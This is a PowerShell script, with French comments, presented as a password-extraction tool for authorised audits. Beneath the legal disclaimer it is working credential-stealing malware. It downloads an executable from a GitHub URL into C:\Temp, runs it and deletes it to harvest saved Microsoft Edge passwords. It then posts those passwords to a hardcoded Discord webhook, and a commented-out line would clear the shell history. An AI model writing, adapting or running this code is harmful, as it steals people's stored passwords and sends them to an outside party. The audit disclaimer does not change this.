<#
.SYNOPSIS
    EdgePwdDumper - Outil d'extraction de mots de passe pour fins d'audit de sécurité.

.DESCRIPTION
    Cet outil est conçu UNIQUEMENT pour des tests de pénétration autorisés,
    des audits de sécurité, ou des recherches en cybersécurité dans un cadre LÉGAL.
    Il permet d'extraire des informations sensibles à des fins d'analyse de vulnérabilités.

.RESPONSABILITÉ :
    - L'auteur de cet outil décline toute responsabilité en cas de mauvaise utilisation.
    - Vous êtes SOLEMENT responsable de vos actions et de leur conformité avec les lois locales.
    - Une utilisation non autorisée peut entraîner des poursuites pénales et des sanctions.

En utilisant cet outil, vous reconnaissez avoir lu et compris ce disclaimer, 
et vous vous engagez à respecter les lois en vigueur dans votre pays.
#>


# Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force

$github = "https://github.com/HackerCAPFM/EdgeSavedPasswordsDumper/raw/refs/heads/main/EdgeSavedPasswordsDumper.exe"
$proxy = ([System.Net.WebRequest]::GetSystemWebproxy()).GetProxy($github)

$outputPath = "C:\Temp\975107DJ31-JHF924NS194-10851DJ931Q2.exe"

Invoke-WebRequest -Uri $github -OutFile $outputPath -Proxy $proxy -ProxyUseDefaultCredentials

$result = & "$outputPath"

Remove-Item -Path $outputPath

if ($result -like '*Total matches found across all processes: 0*'){
    Write-Host "No passwords found"
}else{

    $passwordsList = New-Object System.Collections.ArrayList

    $count = $result.Split("`n").Count - 2
    
    $passwords = $result.Split("`n")

    For ($i=8; $i -lt $count; $i++){
        $passwordsList.Add($passwords[$i]+"`n") | Out-Null
    }

    $webHook = "https://discord.com/api/webhooks/1503368191282253875/HK3_AG_SbkOh1ecRurxrGGD8v1r7uaByR71Z2q9xjjFDO3kMe5w-yajexYBlZA4y0ABI"
    $proxy = ([System.Net.WebRequest]::GetSystemWebproxy()).GetProxy($webHook)

    $embed = @{
        title       = "Liste des mots de passe Edge"
        description = $passwordsList
        color       = 0x3498db  # Bleu
    }

    $payload = @{
        embeds = @($embed)
    } | ConvertTo-Json

    try {
        Invoke-WebRequest -Uri $webHook -Method Post -Body $payload -ContentType 'application/json; charset=UTF-8' -Proxy $proxy -ProxyUseDefaultCredentials | Out-Null
    }
    catch {
        Write-Host "Sending Error" -ForegroundColor Red
    }
}

# Clear-History -Count 5 -Newest